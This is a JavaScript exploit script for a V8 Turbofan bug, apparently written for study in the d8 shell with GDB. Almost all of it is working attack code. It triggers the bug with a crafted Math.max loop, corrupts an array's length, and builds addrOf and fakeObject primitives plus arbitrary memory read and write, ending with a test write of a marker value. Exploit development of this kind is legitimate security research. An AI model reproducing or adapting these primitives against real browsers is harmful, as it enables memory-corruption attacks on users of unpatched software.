///////////////////////////////////////////////////////////// Offsets Needed for Exploit ////////////////////////////////////////////////////////////

DEBUG = false;

TRIGGERED_INDEX_OF_OOB_LENGTH = 22;

OOB_INDEX_OF_VICTIM_SLOT = 18;
VICTIM_INDEX = 0;

OOB_INDEX_OF_ARBRW_ELEMENTS = 32;

/////////////////////////// Helper Functions (credit: https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/) ///////////////////////////

let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

// Float to Integer
function f2i(f) {
	fv[0] = f;
	return dv[0];
}

// Integer to Float
function i2f(i) {
	dv[0] = BigInt(i);
	return fv[0];
}

// Integer to Tagged Integer
function tagInt(i) {
	return i | 1n;
}

// Tagged Integer to Integer
function untagInt(i) {
	return i & ~1n;
}

// Float to Tagged Float
function tagFloat(f) {
	fv[0] = f;
	dv[0] += 1n;
	return fv[0];
}

// Tagged Float to Float
function untagFloat(f) {
	fv[0] = f;
	dv[0] -= 1n;
	return fv[0];
}

// Float to double word hex
function hexprintablef(f) {
	return (f2i(f)).toString(16).padStart(16, "0");
}

// Integer to double word hex
function hexprintablei(i) {
	return (i).toString(16).padStart(16, "0");
}

// Float to word hex
function hexprintablefp(f) {
	return (lowerhalf(f2i(f))).toString(16).padStart(8, "0");
}

// Integer to word hex
function hexprintableip(i) {
	return (lowerhalf(i)).toString(16).padStart(8, "0");
}

function upperhalf(i) {
	return i / 0x100000000n;
}

function lowerhalf(i) {
	return i % 0x100000000n;

}

function shift32(i) {
	return i << 32n;
}

/////////////////////////////////////////////////////////////// Array Length Extension //////////////////////////////////////////////////////////////

function newArrayLen(new_len) {
	old_len = triggered[TRIGGERED_INDEX_OF_OOB_LENGTH];
	triggered[TRIGGERED_INDEX_OF_OOB_LENGTH] = new_len;
	
	if (DEBUG) {
		if (oob.length != new_len) {
			console.log("Length change unsuccessful");
		} else {
			console.log("Length changed from " + old_len + " to " + new_len);
		}
	}
	
	return old_len;
}

/////////////////////////////////////////////////////////// AddrOf / FakeObject Primitives //////////////////////////////////////////////////////////

function addrOf(o) {
	// swap objects
	old_object = victim[VICTIM_INDEX];
	victim[VICTIM_INDEX] = o;

	// read the object's address
	obj_addr = lowerhalf(untagInt(f2i(oob[OOB_INDEX_OF_VICTIM_SLOT])));
	
	// restore object
	victim[VICTIM_INDEX] = old_object;
	
	if (DEBUG) {
		console.log("Address we got: " + hexprintableip(obj_addr));
		console.log("Debug info for object");
		%DebugPrint(o);
	}
	
	return obj_addr;
}

function fakeObject(addr) {
	if (DEBUG) {
		obj_addr = untagInt(lowerhalf(f2i(oob[OOB_INDEX_OF_VICTIM_SLOT])));
		console.log("Old object address for element " + VICTIM_INDEX + ": " + hexprintableip(obj_addr));
		console.log("Debug info for victim before overwrite");
		%DebugPrint(victim);	// check addresses of elements
	}
	
	// store fake object in victim array
	new_addr = tagInt(addr);
	oob[OOB_INDEX_OF_VICTIM_SLOT] = i2f(new_addr);
	
	if (DEBUG) {
		console.log("Debug info for victim after overwrite");
		%DebugPrint(victim);	// check addresses of elements
	}
	
	return victim[VICTIM_INDEX];
}

////////////////////////////////////////////////////////////// Arbitrary R/W Primitives /////////////////////////////////////////////////////////////

function arb_read(addr) {
	if (DEBUG) {
		console.log("Old length: " + arb_rw.length);
	}
	
	elements_addr = f2i(oob[OOB_INDEX_OF_ARBRW_ELEMENTS]);	// found from for loop
	elements_addr_upper = upperhalf(elements_addr);	// get upper 32 bits (size of backing store, modify this to extend reads/writes)
	elements_addr_lower = lowerhalf(elements_addr);	// get lower 32 bits
	new_elements_addr = shift32(elements_addr_upper * 2n) + tagInt(addr - 8n + 4n);	// don't need to increase length here, but you can
	oob[OOB_INDEX_OF_ARBRW_ELEMENTS] = i2f(new_elements_addr);
	
	if (DEBUG) {
		console.log("New length: " + arb_rw.length);	// verify the length is 2x original
	}
	
	val = f2i(arb_rw[0]);
	
	oob[OOB_INDEX_OF_ARBRW_ELEMENTS] = i2f(elements_addr);	// restore old address and length
	if (DEBUG) {
		%DebugPrint(arb_rw);	// verify we fixed this properly
	}
	
	return val;
}

function arb_write(addr, val) {
	if (DEBUG) {
		console.log("Old length: " + arb_rw.length);
	}
	
	elements_addr = f2i(oob[OOB_INDEX_OF_ARBRW_ELEMENTS]);	// found from for loop
	elements_addr_upper = upperhalf(elements_addr);	// get upper 32 bits (size of backing store, modify this to extend reads/writes)
	elements_addr_lower = lowerhalf(elements_addr);	// get lower 32 bits
	new_elements_addr = shift32(elements_addr_upper * 2n) + tagInt(addr - 8n);	// don't need to increase length here, but you can
	oob[OOB_INDEX_OF_ARBRW_ELEMENTS] = i2f(new_elements_addr);
	
	if (DEBUG) {
		console.log("New length: " + arb_rw.length);	// verify the length is 2x original
	}
	
	arb_rw[0] = i2f(val)
	
	oob[OOB_INDEX_OF_ARBRW_ELEMENTS] = i2f(elements_addr);	// restore old address and length
	if (DEBUG) {
		%DebugPrint(arb_rw);	// verify we fixed this properly
	}
}

///////////////////////////////////////////////////////// Function to Trigger Vulnerability /////////////////////////////////////////////////////////

function trigger() {
	var x = -Infinity;
	var k = 0;
	for (var i = 0; i < 1; i += x) {
		if (i == -Infinity) {
			x = +Infinity;
		}

		if (++k > 10) {
			break;
		}
	}

	var value = Math.max(i, 1024);
	value = -value;
	value = Math.max(value, -1025);
	value = -value;
	value -= 1022;
	value >>= 1;
	value += 10;

	var array = Array(value);
	array[0] = 1;	// changed array's type
	return [array, [1.1], [{}, {}, {}, {}], [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]];	// changed return values
};

///////////////////////////////////////////////////////// Function to Trigger Vulnerability /////////////////////////////////////////////////////////

for (let i = 0; i < 50000; ++i) {	// 20000 wasn't reliable in GDB
	trigger();
}

//////////////////////////////////////////////////////// Create Global Arrays for Primitives ////////////////////////////////////////////////////////

var arrays = trigger();
var triggered = arrays[0];
var oob = arrays[1];
var victim = arrays[2];
var arb_rw = arrays[3];

arrays = trigger();

newArrayLen(0x1000);

if (DEBUG) {
	console.log("Debug info for oob array");
	%DebugPrint(oob);

	console.log("Debug info for arb_rw array");
	%DebugPrint(arb_rw);

	// dump raw memory using our oob array
	console.log("OOB array");
	for (i = 0; i < 50; i++) {
		console.log(i + " " + hexprintablef(oob[i]));
	}
}

test = {"test": "test"};
test_addr = addrOf(test);
%DebugPrint(test);
console.log(hexprintablei(test_addr) + ": " + hexprintablei(arb_read(test_addr)));	// verify address contents match GDB
arb_write(test_addr + 32n, 0x4141414142424242n);	// verify address contents match GDB

while(1){}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// ./d8 4.js --allow-natives-syntax
// 
// - OR -
// 
// gdb -q ./d8
// r 4.js --allow-natives-syntax
// Ctrl+c
// x/gx [addr] (use DebugPrint ouput and subtract 1)
// press <enter> until 0x4141414142424242 appears
